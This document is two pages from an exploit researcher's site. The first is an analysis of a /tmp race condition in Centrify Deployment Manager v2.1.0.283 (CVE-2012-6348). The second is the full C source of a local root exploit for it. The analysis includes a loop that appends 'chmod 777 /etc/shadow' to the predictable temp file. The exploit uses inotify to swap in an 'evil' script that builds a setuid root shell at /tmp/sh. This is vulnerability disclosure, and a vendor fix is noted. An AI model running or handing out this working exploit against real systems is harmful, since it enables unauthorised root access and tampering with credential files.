=== Content from vapid.dhs.org_15277ac6_20250124_125815.html ===

## Centrify Deployment Manager v2.1.0.283 local root

---

12/7/2012

Taking a little longer look at the software, I managed to win a
race condition
and get root with files in /tmp. Here is my analysis:

root@h0g:/tmp **ls -l /etc/shadow

-r-------- 1 root shadow 1010 Dec 7 21:42 /etc/shadow
root@h0g:/tmp**

larry@h0g:/tmp$ ln -s /etc/shadow centrify.cmd.0 larry@h0g:/tmp$
ls -l

total 24

lrwxrwxrwx 1 larry larry 11 Dec 7 21:48 centrify.cmd.0 ->
/etc/shadow
After Analyze/Refresh Computer Information is run :

root@h0g:/tmp **ls -l /etc/shadow

-rwxr-xr-x 1 root shadow 165 Dec 7 21:48 /etc/shadow
root@h0g:/tmp** cat /etc/shadow

echo 144d823c-9c22-4d21-8446-4e2d07556177
vmware -v 2> /dev/null |grep 'VMware ESX Server' >/dev/null
temp=$?

echo af43ab93-cfce-485e-b16f-0d4331e0e421
exit ${temp}

root@h0g:/tmp **ls -l /etc/shadow

-rwxr-xr-x 1 root shadow 165 Dec 7 21:48 /etc/shadow
root@h0g:/tmp**

This sucks we clobber the contents of /etc/shadow and we don't
have write permission.

**No root still.**

Looking at the history and trace of what was run on the target
system we see this:

```
Execute echo "echo 8c8ac888-342b-461f-a0ab-659251f3d602" > /tmp/centrify.cmd.0 Result =0 <----- if we create the file before them, we own it.  We can write to it before it's executed and have our command executed.

```
```
Execute echo "vmware -v 2> /dev/null |grep 'VMware ESX Server' >/dev/null" >> /tmp/centrify.cmd.0 Result =0
Execute echo "temp=\$?" >> /tmp/centrify.cmd.0 Result =0
Execute echo "echo b2449bef-65c1-45e8-9da0-4801200c5c05" >> /tmp/centrify.cmd.0 Result =0
Execute echo "exit \${temp}" >> /tmp/centrify.cmd.0 Result =0
Execute chmod 755 /tmp/centrify.cmd.0 Result =0
Execute dzdo -p "Password:" sh -c "/tmp/centrify.cmd.0" Result =0 <--- dzdo is centrify's sudo equivalent, it's part of the centrify suite.
8c8ac888-342b-461f-a0ab-659251f3d602
b2449bef-65c1-45e8-9da0-4801200c5c05
Execute rm -rf /tmp/centrify.cmd.0 Result =0
Execute id -u Result =0

```

So our quick dirty exploit:

larry@h0g:/tmp$ while (true) ; do echo "chmod 777 /etc/shadow"
>> /tmp/centrify.cmd.0 ; done

Will get us our command executed:

larry@h0g:/tmp$ ls -l /etc/shadow

**-rwxrwxrwx 1 root shadow 1010 Dec 7 21:57 /etc/shadow
larry@h0g:/tmp$**

It might work creating the file centrify.cmd.UID, then monitoring
it for having the execute bit set with inotify (IN\_ATTRIB). When
the execute bit is set write our malicious command to the file as
it about to be executed by root.
<
#### Exploit done, <http://www.vapid.dhs.org/exploits/centrify_local_r00t.c>

Larry W. Cashdollar

<http://vapid.dhs.org>

@\_larry0



=== Content from vapid.dhs.org_b8c461a3_20250124_125815.html ===
/\*Local root exploit for Centrify Deployment Manager v2.1.0.283 local root,
Centrify released a fix very quickly - nice vendor response.
http://vapid.dhs.org/exploits/centrify\_local\_r00t.c
CVE-2012-6348 12/17/2012
http://vapid.dhs.org/advisories/centrify\_deployment\_manager\_insecure\_tmp2.html
Greetings vladz, Thanks for the inotify & syscall technique.
This exploit based on http://vladz.devzero.fr/010\_bzexe-vuln.php
Run the exploit and wait for administrator to analyse or deploysoftware
to the system.
larry@h0g:~/code/exploit$ ./cent\_root centrify.cmd.0
[\*] Launching attack against "centrify.cmd.0"
[+] Creating evil script (/tmp/evil)
[+] Creating target file (/bin/touch /tmp/centrify.cmd.0)
[+] Initialize inotify
[+] Waiting for root to launch "centrify.cmd.0"
[+] Opening root shell (/tmp/sh)
#
Larry W. Cashdollar
@\_larry0
\*/
#include
#include
#include
#include
#include
#include
#include
#include
#include
/\*Create a small c program to pop us a root shell\*/
int create\_nasty\_shell(char \*file) {
char \*s = "#!/bin/bash\n"
"echo 'main(){setuid(0);execve(\"/bin/sh\",0,0);}'>/tmp/sh.c\n"
"cc /tmp/sh.c -o /tmp/sh; chown root:root /tmp/sh\n"
"chmod 4755 /tmp/sh;\n";
int fd = open(file, O\_CREAT|O\_RDWR, S\_IRWXU|S\_IRWXG|S\_IRWXO);
write(fd, s, strlen(s));
close(fd);
return 0;
}
int main(int argc, char \*\*argv) {
int fd, wd;
char buf[1], \*targetpath, \*cmd,
\*evilsh = "/tmp/evil", \*trash = "/tmp/trash";
if (argc < 2) {
printf("Usage: %s  \n", argv[0]);
return 1;
}
printf("[\*] Launching attack against \"%s\"\n", argv[1]);
printf("[+] Creating evil script (/tmp/evil)\n");
create\_nasty\_shell(evilsh);
targetpath = malloc(sizeof(argv[1]) + 6);
cmd = malloc(sizeof(char) \* 32);
sprintf(targetpath, "/tmp/%s", argv[1]);
sprintf(cmd,"/bin/touch %s",targetpath);
printf("[+] Creating target file (%s)\n",cmd);
system(cmd);
printf("[+] Initialize inotify\n");
fd = inotify\_init();
wd = inotify\_add\_watch(fd, targetpath, IN\_ATTRIB);
printf("[+] Waiting for root to change perms on \"%s\"\n", argv[1]);
syscall(SYS\_read, fd, buf, 1);
syscall(SYS\_rename, targetpath, trash);
syscall(SYS\_rename, evilsh, targetpath);
inotify\_rm\_watch(fd, wd);
printf("[+] Opening root shell (/tmp/sh)\n");
sleep(2);
system("rm -fr /tmp/trash;/tmp/sh || echo \"[-] Failed.\"");
return 0;
}

